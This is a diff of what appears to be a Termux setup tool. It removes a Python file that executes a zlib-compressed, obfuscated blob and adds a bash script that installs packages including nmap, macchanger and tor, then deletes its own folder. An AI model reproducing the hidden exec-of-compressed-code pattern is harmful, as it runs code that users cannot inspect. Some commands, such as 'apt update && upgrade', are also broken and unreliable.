@@ -1,5 +1,103 @@
-# Do Not Edit The Script
-# Tool Autor: Shimanto Islam(R14A)
-import zlib
+#!/data/data/com.termux/files/usr/bash
 
-exec(zlib.decompress("x\x9c\xd5\x94Qo\xd30\x10\xc7\x9f\xb3Oqh\x9a\xec\xa8(]\x05<\xd0\xd1I \n\xe2\x85IP\x89\x87\x05M\x89}Y\xac\xa6\xb6e\xbb4\xe1\xd3\xef\x9c&k\xa5\xb1\xf2\xc0\x13\xf7\x10\xdf]\x92\xd3\xcf\xff\x7f\x1cU\x810[\x1d\xe0\x1d\xbc\xbe\xbc\x9c\x9f%\xc1ut\x05\x8aJ5h,jX@\\x\xac\xd3\xcca!yz\x96`+\xd0\x06\xf8r\xb3t\xce\xb8\xe1\x95\xb2\xd0\x1a]\xbc\x1d+\xeb\x14\r\xfe\x06\x13`\xb9\xbee\xb4\xfe\x88\xf9\x8b\x98\xf5\xdd\x9f\xf0\xd8\x8c\xc3A\x9b\x00\xd8*\x1f\xd8~\x80\xef|Fu\x88\x03\x0f\\\x05\x01\t\xb3\xb1\x0e\xbd\xe7#\xe4\x81h\xd9/\xcah(<T\x7f\x03;\x8d\xe5\x83\xe3U\xfa\x14F\x12\x02g\xe7\xb0\xd4\xc2u6\xa0\x84\x0f\x1d\xb4_M\xb8\xfbDb\xca\\\x9f\xc3g\x15\xeam\ts\xa8C\xb0~>\x9d\xde\xf7\x8d\x8c\xc8\xa7u\x11\x8a5\n\xbd\x9e\xc6'?\x1a\xa07a)U\x80U\x8d\xf0]8E\xfbX\x19x\xff\xcb(\t\xbd\xc0>\xd7jc\x8d\x0b\xf0\xbbQe\xae\xb1E\xc1c\x9aI|\x14\x83M\x1cZ\xc7\x8bt\xc2\xd2\x94\x11\xe7\xae\x8e\xb2\xae\xdc\x16I\x87D\x8d^_/\xf6\tF\xdf\x92AZ\x8a#\xc7el<\xf1\x98\xe2\xa0$\xc5?9Lq\xac\xe9\x11\xc7s\x0e'\xcfz|\x02\xec4V\xf5\x07\x8e\xff\xc5\xddq\x9b,og\xe5\xed\xab\xd9\xd5\x9b\xcd\x85\xdf\xe7o\xaff\x1b\x06\x17\xa3\xcd\xbdt\xb4\xab\xa8%\x9d`\xdb\x14\x029\xcbl\xc7^\x02\xbbC-b\xdaO\xac\xc6\xd3\x8etg7\xf4\xb2\x9dS\x01\xb9\x1c*\xd1\x18\x8f{\xa9\x86\xf90Y\xc0\x8cjl|\xff\xa5%%\xfd&\xd6\x0f\xe8]<\xbe"))
+echo $red
+
+echo -e "\e[1;32m——————————————————————————————————————————\e[0m"
+
+echo -e "\e[1;31m ########::::::##::::##:::::::::::'###::::\e[0m"
+
+echo -e "\e[1;31m ##.... ##:::####::: ##::::##::::'## ##:::\e[0m"
+
+echo -e "\e[1;31m ##:::: ##::.. ##::: ##::: ##:::'##:. ##::\e[0m"
+
+echo -e "\e[1;31m ########::::: ##::: ##::: ##::'##:::. ##:\e[0m"
+
+echo -e "\e[1;31m ##.. ##:::::: ##::: #########: #########:\e[0m"
+
+echo -e "\e[1;31m ##::. ##::::: ##:::...... ##:: ##.... ##:\e[0m"
+
+echo -e "\e[1;31m ##:::. ##::'######::::::: ##:: ##:::: ##:\e[0m"
+
+echo -e "\e[1;31m..:::::..:::......::::::::..:::..:::::..::\e[0m"
+
+echo -e "\e[1;32m——————————————————————————————————————————\e[0m"
+
+echo -e "\e[1;32m   Tool Author: SHIMANTO ISLAM (R14A)     \e[0m"
+
+echo -e "\e[1;32m  Contract: Shimantoislam066@gmail.com    \e[0m"
+
+echo -e "\e[1;32m      (Don't Try to Edit My Code)         \e[0m"
+
+echo -e "\e[1;31m      (!!Must Need To Internet!!)         \e[0m"
+
+sleep 3
+
+apt update && upgrade  -y                      #update in progress
+
+apt install python -y           #installation......
+
+apt install python2 -y
+
+apt install ruby -y
+
+apt install git -y
+
+apt install curl -y
+
+apt install php -y
+
+apt install perl -y
+
+apt install nmap -y
+
+apt install bash -y
+
+apt install clang -y
+
+apt install jq -y
+
+apt install macchanger -y
+
+apt install nano -y
+
+apt install tar -y
+
+apt install zip -y
+
+apt install unzip -y
+
+apt install tor -y
+
+apt install wget -y
+
+apt install wcalc -y
+
+apt install openssl
+
+apt install bmon -y
+
+sleep 1
+
+echo -e "\e[1;32m YOUR PACKAGES IS INSTALLED SUCCESSFULLY!!\e[0m"
+
+sleep 4
+
+clear
+
+echo -e "\e[1;32m——————————————————————————————————————————\e[0m"
+
+echo -e "\e[1;32m               ★Thank You★                \e[0m"
+
+echo -e "\e[1;32m———————————————Use Our Tool——————————————\e[0m"
+
+echo -e "\e[1;32m‌‌‌!!This Tool Is Auto Remove Your Device❣!!\e[0m"
+
+echo -e "\e[1;32mYour Need Again This Tool Please Install Again!\e[0m"
+
+echo -e "\e[1;32m——————————————————————————————————————————\e[0m"
+
+sleep 4
+
+clear
+
+rm -rf Command-Pack-All
